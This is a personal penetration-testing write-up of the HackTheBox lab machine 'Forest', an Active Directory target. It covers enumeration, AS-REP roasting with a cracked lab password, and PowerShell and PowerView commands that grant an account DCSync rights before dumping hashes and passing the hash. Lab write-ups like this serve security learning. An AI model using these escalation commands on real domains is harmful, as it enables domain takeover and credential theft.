202301291652
Status: #cme #DCSync #ASREProast #PowerView #BloodHound
Tags: [[Labs]]

# Forest
IP: 10.10.10.161

## Recon

Ports open:

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49941/tcp open  unknown
```

Port 445:

- Windows Server 2016 Standard 14393 6.3
- Crackmapexec dumped all users with null authentication

```
sebastien
lucinda
svc-alfresco # Interesting
andy
mark
santi
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
```

## Establish Foothold

- With our valid users, we can try to see which account is ASREProastable

![[forest_asreproast.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/forest_asreproast.png">

- The user `svc-alfresco` is ASREProastable and we got its tgt 
- Cracked the hash with hashcat: `svc-alfresco:s3rvice`

## Escalate Privileges

- After some manual enumeration, not much was found. I decided to gather data for BloodHound rather than run winPEAS.
- After looking through the data, we found that `svc-alfresco` is part of the `Account Operators` group.
- The members of the group `Account Operators` have GenericAll privileges to the group `Exchange Windows Permissions`.
- Furthermore, the `Exchange Windows Permissions` group has permissions to modify the DACL (Discretionary Access Control List) on the domain.

![[forest_perms.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/forest_perms.png">

- With this information, we can add `svc-alfresco` to the `Exchange Windows Permissions` group

```powershell
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "svc-alfresco"
```

- Then we can create our PSCredential Object

```powershell
$pass = ConvertTo-SecureString "s3rvice" -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $pass)
```

- Finally, we can give our account DCSync rights with PowerView

```powershell
Add-DomainObjectAcl -Credential $creds -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
```

- Then we can finally run `secretsdump.py` to dump hashes

![[forest_hashes.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/forest_hashes.png">

- We the Administrator NTLM hash, we can try to Pass-the-Hash
- We were able to successfully authenticate using Administrator's NTLM hash


---
# References
